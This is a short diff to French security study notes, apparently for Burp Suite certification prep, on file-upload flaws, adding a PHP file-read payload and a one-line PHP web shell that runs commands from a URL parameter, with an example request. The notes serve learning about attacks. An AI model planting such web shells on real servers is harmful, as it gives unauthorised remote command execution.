@@ -38,7 +38,8 @@ statut: à faire
 	- Utilise le serveur comme pivot pour attaquer l'infrastructure interne et d'autres serveurs extérieurs au réseau.
 - Exemple en PHP:
 	- Lecture de fichier : `<?php echo file_get_contents('/path/to/target/file'); ?>`. Une requête vers le fichier téléversé renvoie le contenu du fichier ciblé dans la réponse.
-	- 
+	- Web shell polyvalent : `<?php echo system($_GET['command']); ?>`. Il exécute une commande système transmise via un paramètre de requête.
+	- Utilisation : `GET /example/exploit.php?command=id HTTP/1.1`.
 
 ## Pièges et points d'attention BSCP
 - 
